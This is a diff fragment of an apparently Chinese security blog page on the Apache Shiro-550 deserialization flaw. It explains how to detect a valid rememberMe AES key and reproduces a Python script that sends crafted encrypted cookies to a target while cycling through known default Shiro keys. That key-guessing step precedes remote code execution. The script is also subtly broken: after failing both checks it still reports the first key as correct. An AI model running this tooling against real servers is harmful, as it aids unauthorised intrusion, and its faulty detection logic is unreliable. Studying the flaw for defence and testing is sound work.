+<p>那么如何判断密钥是否正确呢？文章 <a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式<i class="fas fa-external-link-alt"></i></a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p>
 <p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p>
 <p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
 <p>这里给出大佬 Veraxy 的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="comment"># 此处简单列举几个密钥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> </span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBC加密</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY ：&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCM加密</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/shiro%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" >Shiro550反序列化漏洞分析 – JohnFrod’s Blog<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645" >Shiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/shiro%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">Shiro550反序列化漏洞分析 – JohnFrod’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645">Shiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
